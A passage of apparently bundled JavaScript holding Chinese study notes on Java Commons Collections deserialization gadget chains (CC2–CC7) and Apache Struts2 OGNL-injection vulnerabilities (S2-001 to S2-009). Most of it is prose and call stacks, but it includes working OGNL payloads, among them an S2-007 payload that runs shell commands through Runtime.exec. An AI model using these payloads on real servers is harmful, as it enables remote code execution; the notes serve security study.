                                      ->ChainedTransformer.transform()
                                      ->ConstantTransformer.transform()
                                          ->InvokerTransformer.transform()
                                          ->\u2026\u2026\u2026\u2026

      2\u3001CC2
              1\u3001\u5229\u7528\u6761\u4EF6\u6BD4\u8F83\u82DB\u523B\uFF1A
                      1\u3001\u9996\u5148 CommonsCollections3 \u4E2D\u65E0\u6CD5\u4F7F\u7528\uFF0C
                              \u56E0\u4E3A\u5176 TransformingComparator \u65E0\u6CD5\u5E8F\u5217\u5316\u3002
                      2\u3001\u5176\u6B21\u53EA\u6709 CommonsCollections4-4.0 \u53EF\u4EE5\u4F7F\u7528\uFF0C
                              \u56E0\u4E3A CommonsCollections4 \u5176\u4ED6\u7248\u672C\u53BB\u6389\u4E86 InvokerTransformer \u7684 Serializable \u7EE7\u627F\uFF0C\u5BFC\u81F4\u65E0\u6CD5\u5E8F\u5217\u5316\u3002

              2\u3001\u8FD9\u91CC\u9700\u8981\u5F15\u5165\u4E24\u4E2A\u65B0\u7684\u7C7B\uFF0C
                      1\u3001\u9996\u5148\u662F PriorityQueue \u90E8\u5206\u5173\u952E\u4EE3\u7801\u5982\u4E0B\uFF1A
                              xxxxxx
                      2\u3001\u53EF\u4EE5\u770B\u5230\u5176\u53CD\u5E8F\u5217\u5316\u65F6\u8C03\u7528 readObject \u65B9\u6CD5\uFF0C\u7136\u540E\u6700\u7EC8\u4F1A\u8C03\u7528 \u6211\u4EEC\u81EA\u5B9A\u4E49\u7684 Comparator \u7684 compare \u65B9\u6CD5\u3002
                              1\u3001\u90A3\u4E48\u8FD9\u4E2A\u81EA\u5B9A\u4E49\u7684 Comparator \u6211\u4EEC\u8981\u600E\u4E48\u5B9E\u73B0\u5462\uFF1F
                                      1\u3001\u501F\u52A9 TransformingComparator \u7C7B\uFF0C\u53EF\u4EE5\u770B\u5230\u5176 Comparator \u65B9\u6CD5\u4E2D\u4F1A\u8C03\u7528 this.transformer.transform()\u3002
                                              \u8FD9\u662F\u4E00\u4E2A\u5173\u952E\u70B9\uFF0C\u6BD5\u7ADF\u62FF\u5230 Transformer.transform() \u5C31\u4EC0\u4E48\u90FD\u597D\u8BF4\u3002
                              2\u3001\u6700\u540E\u6211\u4EEC\u5B9E\u73B0\u7684\u4EE3\u7801\u5982\u4E0B\uFF1A
                                      xxxxxx

              4\u3001\u5927\u4F53\u8C03\u7528\u6808\uFF1A
                      ->PriorityQueue.readObject()
                            ->PriorityQueue.heapify()
                                ->PriorityQueue.siftDown()
                                  ->PriorityQueue.siftDownUsingComparator()
                                      ->TransformingComparator.compare()
                                          ->InvokerTransformer.transform()
                                              ->TemplatesImpl.newTransformer()
                                              ->\u2026\u2026\u2026\u2026

      3\u3001CC3
              1\u3001\u5BF9 CC1 \u8FDB\u884C\u4E86\u4E00\u4E9B\u4FEE\u6539\u3002\u5F15\u5165\u4E86 TemplatesImpl \u6765\u52A0\u8F7D\u5B57\u8282\u7801\uFF0C\u53BB\u6389\u4E86 InvokerTransformer \uFF0C\u5F15\u5165\u4E86 InstantiateTransformer\u3002
                      1\u3001TemplatesImpl\u3001InstantiateTransformer\u3001TrAXFilter \u4E0A\u9762 \u300ATemplatesImpl\u7AE0\u8282\u300B \u5DF2\u7ECF\u4ECB\u7ECD\u4E86\uFF0C\u8FD9\u91CC\u4E0D\u518D\u8D58\u8FF0\u3002

              2\u3001\u5982\u4F55\u901A\u8FC7 AnnotationInvocationHandler.readObject() \u6765\u89E6\u53D1 LazyMap.get() \u4E5F\u4E0E\u4E0A\u9762\u7684 CC1 \u4E00\u81F4\u3002
                      xxxxxx

              3\u3001\u6D4B\u8BD5\u73AF\u5883\uFF1A
                      3.1-3.2.1\uFF0Cjdk7u21\u53CA\u4EE5\u524D

              4\u3001\u5927\u4F53\u8C03\u7528\u6808\uFF1A
                      ->AnnotationInvocationHandler.readObject()
                            ->mapProxy.entrySet().iterator()  //\u52A8\u6001\u4EE3\u7406\u7C7B
                                ->AnnotationInvocationHandler.invoke()
                                  ->LazyMap.get()
                                      ->ChainedTransformer.transform()
                                          ->ConstantTransformer.transform()
                                              ->InstantiateTransformer.transform()
                                                  ->TrAXFilter.TrAXFilter()
                                                      ->TemplatesImpl.newTransformer()
                                                          ->\u2026\u2026\u2026\u2026

      4\u3001CC4
              1\u3001CC4 \uFF0C\u53EA\u662F\u5C06 CC2 \u4E2D\u7684 InvokerTransformer \u66FF\u6362\u4E3A\u4E86 InstantiateTransformer\u3002
                      1\u3001\u662F\u57FA\u4E8ECC2\u7684\u601D\u8003\uFF1A
                              1\u3001\u4E0A\u9762 CC2 \u8BF4\u4E86\u56E0\u4E3A CommonsCollections4 \u96644.0\u7684\u5176\u4ED6\u7248\u672C\u53BB\u6389\u4E86 InvokerTransformer \u7684 Serializable \u7EE7\u627F\uFF0C\u5BFC\u81F4\u65E0\u6CD5\u5E8F\u5217\u5316\u3002\u6240\u4EE5\u6211\u4EEC\u662F\u5426\u53EF\u4EE5\u4E0D\u4F7F\u7528 InvokerTransformer \u5462\uFF1F
                              2\u3001\u4E8E\u662F\u4FBF\u6709\u4E86 CC4
              2\u3001\u4EE3\u7801\u5B9E\u73B0\uFF1A
                      xxxxxx

              3\u3001\u6D4B\u8BD5\u73AF\u5883\uFF1A
                      4.0\uFF0Cjdk7u21\u53CA\u4EE5\u524D

              4\u3001\u5927\u4F53\u8C03\u7528\u6808\uFF1A
                      ->PriorityQueue.readObject()
                            ->PriorityQueue.heapify()
                                ->PriorityQueue.siftDown()
                                  ->PriorityQueue.siftDownUsingComparator()
                                       ->TransformingComparator.compare()
                                          ->ChainedTransformer.transform()
                                              ->ConstantTransformer.transform()
                                                          ->InstantiateTransformer.transform()
                                                   ->TrAXFilter.TrAXFilter()
                                                       ->TemplatesImpl.newTransformer()
                                                              ->\u2026\u2026\u2026\u2026

      5\u3001CC5
              1\u3001\u8FD9\u91CC\u6211\u4EEC\u53C8\u56DE\u5230\u4E86\u53BB\u89E6\u53D1 LazyMap.get()\uFF0C\u53EA\u4E0D\u8FC7\u6211\u4EEC\u6539\u53D8\u4E86 LazyMap.get() \u7684\u89E6\u53D1\u65B9\u5F0F\uFF0C
                      1\u3001\u4E0D\u518D\u548C CC1 \u548C CC3 \u4E00\u6837\u501F\u52A9 AnnotationInvocationHandler \u7684\u53CD\u5E8F\u5217\u5316\u89E6\u53D1\u3002
                      2\u3001\u8FD9\u91CC\u5F15\u5165\u65B0\u7C7B TiedMapEntry \u3002
                              xxxxxx
                              2\u3001\u7EFC\u4E0A\uFF0C\u901A\u8FC7 TiedMapEntry.toString() \u53EF\u89E6\u53D1 LazyMap.get()

                      3\u3001\u90A3\u4E48\u6709\u6CA1\u6709\u4E00\u4E2A\u7C7B\u53EF\u4EE5\u5728\u53CD\u5E8F\u5217\u5316\u65F6\u89E6\u53D1 TiedMapEntry.toString() \u5462\uFF1F
                              BadAttributeValueExpException\uFF01

              2\u3001\u6700\u7EC8\u5B9E\u73B0\u4EE3\u7801\uFF1A
                      xxxxxx

              3\u3001\u6D4B\u8BD5\u73AF\u5883\uFF1A
                      3.1-3.2.1\uFF0Cjdk1.8

              4\u3001\u5927\u4F53\u8C03\u7528\u6808\uFF1A
                      ->BadAttributeValueExpException.readObject()
                            ->TiedMapEntry.toString()
                                ->TiedMapEntry.getValue()
                                  ->LazyMap.get()
                                      ->ChainedTransformer.transform()
                                          ->ConstantTransformer.transform()
                                                  ->InvokerTransformer.transform()
                                                      ->\u2026\u2026\u2026\u2026


      6\u3001CC6
              1\u3001\u57FA\u4E8ECC5\uFF0C\u91C7\u7528\u4E86HashMap\u3002
                      1\u3001\u5BF9\u6BD4CC5\u3002
                              CC5 \u7528\u4E86 BadAttributeValueExpException \u53CD\u5E8F\u5217\u5316\u53BB\u89E6\u53D1 LazyMap.get()\uFF0C
                                      1\u3001\u9664\u4E86 BadAttributeValueExpException \u3001AnnotationInvocationHandler \u8FD8\u6709\u5176\u4ED6\u65B9\u6CD5\u5417\uFF1F
                                      2\u3001\u5C31\u662F\u8FD9\u91CC\u7684 HashMap

                      2\u3001\u6211\u4EEC\u518D\u7814\u7A76\u7814\u7A76 TiedMapEntry \u8FD9\u4E2A\u7C7B
                              xxxxxx
                              2\u3001\u5982\u4F55\u53CD\u5E8F\u5217\u5316\u65F6\u89E6\u53D1 TiedMapEntry.hashCode() ? \u8FD9\u5C31\u5F15\u5165\u4E86 HashMap!
                                      xxxxxx

              2\u3001\u6700\u7EC8\u5B9E\u73B0\u4EE3\u7801\uFF1A
                      xxxxxx

              3\u3001\u6D4B\u8BD5\u73AF\u5883\uFF1A
                      3.1-3.2.1\uFF0Cjdk1.7,1.8

              4\u3001\u5927\u4F53\u8C03\u7528\u6808\uFF1A
                      // \u8FD9\u91CC\u662F jdk 1.7 \u7684\uFF0C\u4E0D\u540C\u7248\u672C HashMap readObject \u53EF\u80FD\u7565\u6709\u4E0D\u540C
                        ->HashMap.readObject()
                            ->HashMap.putForCreate()
                                ->HashMap.hash()
                                  ->TiedMapEntry.hashCode()
                                          ->TiedMapEntry.getValue()
                                          ->LazyMap.get()
                                            ->ChainedTransformer.transform()
                                                ->ConstantTransformer.transform()
                                                    ->InvokerTransformer.transform()
                                                        ->\u2026\u2026\u2026\u2026

      7\u3001CC7
              1\u3001\u8FD9\u91CC\u4ECD\u7136\u662F\u60F3\u6CD5\u5B50\u89E6\u53D1LazyMap.get()\u3002
                      1\u3001HashTable \u7684 readObject \u4E2D. \u9047\u5230 \u300Ahash\u78B0\u649E\u300B \u65F6, \u901A\u8FC7\u8C03\u7528\u4E00\u4E2A\u5BF9\u8C61\u7684 equals \u65B9\u6CD5\u5BF9\u6BD4\u4E24\u4E2A\u5BF9\u8C61\u5224\u65AD\u662F\u5426 \u771F\u7684 \u300Ahash\u78B0\u649E\u300B.
                              1\u3001\u8FD9\u91CC\u7684 equals \u65B9\u6CD5\u662F AbstractMap \u7684 equals \u65B9\u6CD5\u3002
                                      xxxxxx
                              2\u3001HashTable \u7C7B\u7684\u5173\u952E\u4EE3\u7801\u5982\u4E0B\uFF1A
                                      xxxxxx
                              4\u3001\u8DDF\u8FDB\u4E0A\u9762\u7684 equals \u65B9\u6CD5\uFF0C\u53D1\u73B0\u6700\u7EC8\u8C03\u7528\u4E86 AbstractMap \u7C7B\u7684 equals \u65B9\u6CD5\uFF0C\u5982\u4E0B\uFF1A
                                      xxxxxx
                                      2\u3001\u5C31\u662F\u5728\u8FD9\u91CC\u89E6\u53D1\u4E86 LazyMap.get()\u3002

              2\u3001

              3\u3001\u6D4B\u8BD5\u73AF\u5883\uFF1A
                      3.1-3.2.1\uFF0Cjdk1.7,1.8

              4\u3001\u5927\u4F53\u8C03\u7528\u6808\uFF1A
                      // \u8FD9\u91CC\u662F jdk 1.7 \u7684\uFF0C\u4E0D\u540C\u7248\u672C HashMap readObject \u53EF\u80FD\u7565\u6709\u4E0D\u540C
                        ->Hashtable.readObject()
                            ->Hashtable.reconstitutionPut()
                                  ->AbstractMapDecorator.equals
                                      ->AbstractMap.equals()
                                        ->LazyMap.get.get()
                                          ->ChainedTransformer.transform()
                                            ->ConstantTransformer.transform()
                                              ->InvokerTransformer.transform()
                                                ->\u2026\u2026\u2026\u2026



  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0})],ju=`S045 \u548C S046 \u7684\u5171\u540C\u70B9\uFF1A
        1\u3001S2-045\u662F\u5728Content-Type\u503C\u6CE8\u5165ognl\u8868\u8FBE\u5F0F\u4ECE\u800C\u5F15\u8D77\u89E3\u6790\u5F02\u5E38\uFF0C
        2\u3001S2-046\u5219\u662F\u5728\u4E0A\u4F20\u6587\u4EF6\u7684Content-Disposition\u4E2D\u7684Filename\u53C2\u6570\u5B58\u5728\u7A7A\u5B57\u8282\uFF0C\u5728\u68C0\u67E5\u65F6\u629B\u51FA\u5F02\u5E38\uFF0C\u4ECE\u800C\u8FDB\u5165buildErrorMessage()\u65B9\u6CD5\u3002
        3\u3001\u5B9E\u5219S2-045\u548CS2-046\u6F0F\u6D1E\u539F\u7406\u76F8\u540C\u3002
`,Y=[Object(u.c)("struts2_\u4E2D\u7684__XML_XXE__\u6CE8\u5165",`

  `.concat(nu,`

  `),{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-001 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2007-4556\uFF09",`

  S2-001 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2007-4556\uFF09

      \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
              Struts 2.0.0 - 2.0.8

              WebWork 2.1 (with altSyntax enabled),
              WebWork 2.2.0 - WebWork 2.2.5

      \u5229\u7528\u6761\u4EF6

      \u6F0F\u6D1E\u6982\u8FF0

      \u539F\u7406\u5206\u6790
              1\u3001\u8BE5\u6F0F\u6D1E\u56E0\u7528\u6237\u63D0\u4EA4\u8868\u5355\u6570\u636E\u4E14\u9A8C\u8BC1\u5931\u8D25\u65F6 \u2014\u2014\u2014\u2014\u2014\u2014 \u540E\u7AEF\u4F1A\u5C06\u7528\u6237\u4E4B\u524D\u63D0\u4EA4\u7684\u6570\u636E\u4F7F\u7528OGNL\u8868\u8FBE\u5F0F%{value}\u8FDB\u884C\u89E3\u6790\uFF0C\u7136\u540E\u91CD\u65B0\u586B\u5145\u5230\u5BF9\u5E94\u7684\u8868\u5355\u6570\u636E\u4E2D\u3002
              2\u3001\u5982\u6CE8\u518C\u6216\u767B\u5F55\u9875\u9762\uFF0C\u63D0\u4EA4\u5931\u8D25\u540E\u4E00\u822C\u4F1A\u9ED8\u8BA4\u8FD4\u56DE\u4E4B\u524D\u63D0\u4EA4\u7684\u6570\u636E\uFF0C
                      1\u3001\u7531\u4E8E\u540E\u7AEF\u4F7F\u7528%{value}\u5BF9\u63D0\u4EA4\u7684\u6570\u636E\u6267\u884C\u4E86\u4E00\u6B21OGNL\u8868\u8FBE\u5F0F\u89E3\u6790\uFF0C\u6240\u4EE5\u53EF\u4EE5\u76F4\u63A5\u6784\u9020Payload\u8FDB\u884C\u547D\u4EE4\u6267\u884C\u3002
              3\u3001\u5177\u4F53\u7684\u8C03\u7528\u94FE\uFF1A
                      1\u3001\u7ECF\u5206\u6790\uFF0C\u6F0F\u6D1E\u51FA\u73B0\u5728doEndTag()\u5904\u7406\u8FC7\u7A0B\u4E2D\u3002
                      2\u3001\u5F53\u5904\u7406\u5230\u8868\u5355\u4E2D\u7684 \u300A \\> \u300B \u65F6\u4F1A\u901A\u8FC7org.apache.struts2.views.jsp.ComponentTagSupport\u7684doEndTag\u65B9\u6CD5\u89E3\u6790\u76F8\u5E94\u6807\u7B7E\u7684\u5C5E\u6027\u3002
                              1\u3001\u8DDF\u8E2A\u5230org.apache.struts2.components.UIBean#end\u4E2D\u7684evaluateParams\u65B9\u6CD5\uFF0C\u5728\u5904\u7406\u8868\u5355\u4E2Dname\u4E3Ausername\u7684textfield\u5B57\u6BB5\u65F6\uFF0C\u5C06\u8BE5name\u5305\u88C5\u4E3A%{}\u7684\u5F62\u5F0F\u4EA4\u7ED9findValue\u5904\u7406\u3002
                                      1\u3001\u5177\u4F53\u4EE3\u7801\u5982\u4E0B\uFF1A
                                              xxxxxx
                              2\u3001\u5206\u6790struts2-corejar\u5305\u4E2D\u7684findvalue\u65B9\u6CD5\uFF0C
                                      1\u3001\u8BE5\u6F0F\u6D1E\u7248\u672C\u652F\u6301altSyntax\u7279\u6027\uFF0C\u5E76\u8FDB\u5165TextParseUtil.translateVariables('%', expr, this.stack);\u65B9\u6CD5\u5904\u7406\u8868\u8FBE\u5F0Fexpr\u3002
                              3\u3001\u5728xwor-2.0-beat-1.jar\uFF08\u672C\u6B21\u6F0F\u6D1E\u6D4B\u8BD5\u73AF\u5883\uFF09\u4E2D\u7684com.opensymphony.xwork2.util.TextParseUtil#translateVariables()\u65B9\u6CD5\u5904\u7406\u8868\u8FBE\u5F0F\u4E2D\u8FDB\u884C\u9012\u5F52\u5904\u7406\uFF0C
                                      1\u3001\u4ECE\u800C\u5BFC\u81F4\u7528\u6237\u63D0\u4EA4\u7684value\u8FDB\u884C\u4E8C\u6B21\u89E3\u6790\uFF0C\u5BFC\u81F4S2-001\u6F0F\u6D1E\u7684\u89E6\u53D1\u3002

      \u6F0F\u6D1E\u5229\u7528
              1\u3001\u6F0F\u6D1E\u9A8C\u8BC1\uFF1A
                      1\u3001\u9A8C\u8BC1\u6F0F\u6D1E\u662F\u5426\u5B58\u5728\uFF0C\u8F93\u5165
                              %{'zcc'}
                                      1\u3001\u8FD4\u56DEzcc\u5C31\u662F\u5B58\u5728\u8BE5\u6F0F\u6D1E
              1\u3001\u5229\u7528\u65B9\u5F0F\uFF1A
                      1\u3001\u793A\u4F8B\uFF0CPoc\u83B7\u53D6tomcat\u8DEF\u5F84\uFF1A
                              %{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-003 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-003 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001\u548C \u300AS2-005\u300B \u57FA\u672C\u76F8\u540C\u3002

          \u539F\u7406\u5206\u6790

          \u6F0F\u6D1E\u5229\u7528

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-005 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-005 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09

      \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
              Struts 2.0.0-2.1.8.1

      \u5229\u7528\u6761\u4EF6

      \u6F0F\u6D1E\u6982\u8FF0
              1\u3001S2-005\u7684\u51FA\u73B0\u65F6\u56E0\u4E3A\u5B98\u65B9\u5BF9S2-003\u7684\u4FEE\u8865\u7684\u4E0D\u5B8C\u5168\u800C\u5BFC\u81F4\u3002
                      1\u3001s2-005\u6F0F\u6D1E\u7684\u8D77\u6E90\u6E90\u4E8Es2-003\uFF08\u53D7\u5F71\u54CD\u7248\u672C\uFF1A\u4F4E\u4E8EStruts2.0.12\uFF09\uFF0Cstruts2\u4F1A\u5C06http\u7684\u6BCF\u4E2A\u53C2\u6570\u540D\u89E3\u6790\u4E3AODNL\u8BED\u53E5\u6267\u884C\uFF08\u53EF\u7406\u89E3\u4E3AJava\u4EE3\u7801\uFF09\u3002

      \u539F\u7406\u5206\u6790
              1\u3001\u6F0F\u6D1E\u89E6\u53D1\u6E90\u4E8E ParameterInterceptor \u62E6\u622A\u5668\u4E2D\uFF0C\u53EF\u901A\u8FC7\u6784\u9020\u53C2\u6570\u7ED5\u8FC7\u6B63\u5219\u9650\u5236\u4ECE\u800C\u6267\u884Cognl\u8868\u8FBE\u5F0F\u3002
              2\u3001OGNL\u8868\u8FBE\u5F0F\u901A\u8FC7 \u300A#\u300B \u6765\u8BBF\u95EEstruts\u7684\u5BF9\u8C61\uFF0Cstruts\u6846\u67B6\u901A\u8FC7\u8FC7\u6EE4 \u300A#\u300B \u5B57\u7B26\u9632\u6B62\u5B89\u5168\u95EE\u9898\uFF0C
                      1\u3001\u7136\u800C\u901A\u8FC7unicode\u7F16\u7801\uFF08\\u0023)\u62168\u8FDB\u5236\uFF08\\43\uFF09\u5373\u7ED5\u8FC7\u4E86\u5B89\u5168\u9650\u5236\uFF0C
                      2\u3001\u5BF9\u4E8ES2-003\u6F0F\u6D1E\uFF0C\u5B98\u65B9\u901A\u8FC7\u589E\u52A0\u5B89\u5168\u914D\u7F6E\uFF08\u7981\u6B62\u9759\u6001\u65B9\u6CD5\u8C03\u7528\u548C\u7C7B\u65B9\u6CD5\u6267\u884C\u7B49\uFF09\u6765\u4FEE\u8865\uFF0C\u4F46\u662F\u5B89\u5168\u914D\u7F6E\u88AB\u7ED5\u8FC7\u518D\u6B21\u5BFC\u81F4\u4E86\u6F0F\u6D1E\uFF0C
                              1\u3001\u653B\u51FB\u8005\u53EF\u4EE5\u5229\u7528OGNL\u8868\u8FBE\u5F0F\u5C06\u8FD9\u4E24\u4E2A\u9009\u9879\u6253\u5F00\uFF0CS2-003\u7684\u4FEE\u8865\u65B9\u5F0F\u628A\u81EA\u5DF1\u4E0A\u4E86\u4E00\u4E2A\u9501\uFF0C\u4F46\u662F\u628A\u94A5\u5319\u63D2\u5728\u4E86\u9501\u5934\u4E0A\u3002

      \u6F0F\u6D1E\u5229\u7528
              1\u3001\u7ED5\u8FC7\u8FC7\u7A0B\uFF1A
                      1\u3001\u5728S2-003\u4E2D \\u0023 \u7528\u4E8E\u7ED5\u8FC7struts2\u7684\u8FC7\u6EE4\u5668#
                      2\u3001\u5728S2-003\u4E2D struts2\u6DFB\u52A0\u5B89\u5168\u6A21\u5F0F\uFF08\u6C99\u76D2\uFF09\u4E4B\u540E
                      3\u3001\u5728S2-005\u4E2D\uFF0C\u4F7F\u7528OGNL\u8868\u8FBE\u5F0F\u5173\u95ED\u5B89\u5168\u6A21\u5F0F\u5E76\u518D\u6B21\u7ED5\u8FC7

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-007 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-007 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09

      \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
              2.0.0 - 2.2.3

      \u5229\u7528\u6761\u4EF6

      \u6F0F\u6D1E\u6982\u8FF0
              1\u3001\u67D0\u4E2A\u5B57\u6BB5\uFF0C\u6765\u81EA\u4E8E\u7528\u6237\u8F93\u5165\uFF0C\u4F20\u9012\u4E00\u4E2A\u975E\u6574\u6570\u7ED9id\u5BFC\u81F4\u9519\u8BEF\uFF0Cstruts\u4F1A\u5C06\u7528\u6237\u7684\u8F93\u5165\u5F53\u4F5Congl\u8868\u8FBE\u5F0F\u6267\u884C\uFF0C\u4ECE\u800C\u5BFC\u81F4\u4E86\u6F0F\u6D1E\u3002

      \u539F\u7406\u5206\u6790
              1\u3001\u5F53\u914D\u7F6E\u4E86\u9A8C\u8BC1\u89C4\u5219 <ActionName>-validation.xml \u65F6\uFF1A
                      1\u3001\u5982\u679C\u7C7B\u578B\u9A8C\u8BC1\u8F6C\u6362\u51FA\u9519\uFF0C\u540E\u7AEF\u9ED8\u8BA4\u4F1A\u5C06\u7528\u6237\u63D0\u4EA4\u7684\u8868\u5355\u503C\u901A\u8FC7\u5B57\u7B26\u4E32\u62FC\u63A5\uFF0C\u7136\u540E\u6267\u884C\u4E00\u6B21 OGNL \u8868\u8FBE\u5F0F\u89E3\u6790\uFF0C
                              1\u3001\u9020\u6210OGNL\u8868\u8FBE\u5F0F\u6CE8\u5165\u3002\u4ECE\u800C\u53EF\u80FD\u9020\u6210\u8FDC\u7A0B\u6267\u884C\u4EE3\u7801\u3002


              2\u3001\u5F53\u7528\u6237 age\u5B57\u6BB5 \uFF0C\u4EE5 String\u7C7B\u578B \u800C\u4E0D\u662F int\u7C7B\u578B \u7684\u5F62\u5F0F\u63D0\u4EA4\u65F6\uFF1A
                      1\u3001\u4F1A\u7ECF\u8FC7com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor\u62E6\u622A\u5668\u8FDB\u884C\u62E6\u622A\u5904\u7406\u3002
                              \u5177\u4F53\u8FC7\u7A0B\u7565
                      2\u3001\u670D\u52A1\u5668\u5C06\u62FC\u63A5 \u300A"'" + value + "'"\u300B \u4EE3\u7801\uFF0C\u7136\u540E\u4F7F\u7528OGNL\u8868\u8FBE\u5F0F\u5BF9\u5176\u8FDB\u884C\u89E3\u6790\u3002

              3\u3001\u4E3A\u4E86\u6210\u529F\u653B\u51FB\uFF0C\u6211\u4EEC\u9700\u8981\u627E\u5230\u4E00\u4E2A\u914D\u7F6E\u6709\u76F8\u4F3C\u9A8C\u8BC1\u89C4\u5219\u7684Form\u8868\u5355 \u7684 \u5B57\u6BB5\uFF0C\u4EE5\u4EA7\u751F \u7C7B\u578B\u8F6C\u6362\u9519\u8BEF\u3002
                      1\u3001\u7136\u540E\uFF0C\u60A8\u53EF\u4EE5\u901A\u8FC7\u6CE8\u5165SQL\u5355\u5F15\u53F7\u7684\u65B9\u5F0F\uFF0C\u6CE8\u5165 \u4EFB\u610FOGNL\u8868\u8FBE\u5F0F \u4EE3\u7801

      \u6F0F\u6D1E\u5229\u7528
              1\u3001\u6F0F\u6D1E\u9A8C\u8BC1\uFF1A
                      1\u3001\u5728\u8F93\u5165\u6846\u4E2D\uFF0C\u8F93\u5165 \u300A\u975E\u6570\u5B57\u7C7B\u578B\u300B \u70B9\u51FB\u767B\u5F55\uFF0C\u5E74\u9F84\u6846\u4E2D\u7684value\u53D8\u6210 11\u7B49\u7EAF\u6570\u5B57 \uFF0C\u5373\u53EF\u8BC1\u660E\u6F0F\u6D1E\u5B58\u5728\uFF01
              2\u3001Payload\u5982\u4E0B\uFF1A
                      ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('find /tmp/ -name flag*').getInputStream())) + '

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-008 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-008 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09

          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  2.1.0 - 2.3.1

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001S2-008 \u6D89\u53CA\u591A\u4E2A\u6F0F\u6D1E\uFF0CCookie \u62E6\u622A\u5668\u9519\u8BEF\u914D\u7F6E\u53EF\u9020\u6210 OGNL \u8868\u8FBE\u5F0F\u6267\u884C\uFF0C
                          1\u3001\u4F46\u662F\u7531\u4E8E\u5927\u591A Web \u5BB9\u5668\uFF08\u5982 Tomcat\uFF09\u5BF9 Cookie \u540D\u79F0\u90FD\u6709\u5B57\u7B26\u9650\u5236\uFF0C\u4E00\u4E9B\u5173\u952E\u5B57\u7B26\u65E0\u6CD5\u4F7F\u7528\u4F7F\u5F97\u8FD9\u4E2A\u70B9\u663E\u5F97\u6BD4\u8F83\u9E21\u808B\u3002
                          2\u3001\u53E6\u4E00\u4E2A\u6BD4\u8F83\u9E21\u808B\u7684\u70B9\u5C31\u662F\u5728 struts2 \u5E94\u7528\u5F00\u542F devMode \u6A21\u5F0F\u540E\u4F1A\u6709\u591A\u4E2A\u8C03\u8BD5\u63A5\u53E3\u80FD\u591F\u76F4\u63A5\u67E5\u770B\u5BF9\u8C61\u4FE1\u606F\u6216\u76F4\u63A5\u6267\u884C\u547D\u4EE4\uFF0C
                                  1\u3001\u8FD9\u79CD\u60C5\u51B5\u5728\u751F\u4EA7\u73AF\u5883\u4E2D\u51E0\u4E4E\u4E0D\u53EF\u80FD\u5B58\u5728\uFF0C\u56E0\u6B64\u5C31\u53D8\u5F97\u5F88\u9E21\u808B\u3002

          \u539F\u7406\u5206\u6790

          \u6F0F\u6D1E\u5229\u7528


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-009 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-009 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09

          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.1.0 - 2.3.1.1
                          \uFF08\u8FD8\u6709\u4E00\u79CD\u8BF4\u6CD5\uFF0C\u662F    Struts 2.0.0 - Struts 2.3.1.1  \uFF09

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0

          \u539F\u7406\u5206\u6790
                    1\u3001OGNL\u63D0\u4F9B\u4E86\u5E7F\u6CDB\u7684\u8868\u8FBE\u5F0F\u8BC4\u4F30\u529F\u80FD\u7B49\u529F\u80FD\u3002\u8BE5
                    1\u3001\u6F0F\u6D1E\u5141\u8BB8\u6076\u610F\u7528\u6237\u7ED5\u8FC7ParametersInterceptor\u5185\u7F6E\u7684\u6240\u6709\u4FDD\u62A4\uFF08\u6B63\u5219\u8868\u8FBE\u5F0F\uFF0C\u62D2\u7EDD\u65B9\u6CD5\u8C03\u7528\uFF09\uFF0C\u4ECE\u800C\u80FD\u591F\u5C06\u4EFB\u4F55\u66B4\u9732\u7684\u5B57\u7B26\u4E32\u53D8\u91CF\u4E2D\u7684\u6076\u610F\u8868\u8FBE\u5F0F\u6CE8\u5165\u8FDB\u884C\u8FDB\u4E00\u6B65\u8BC4\u4F30\u3002
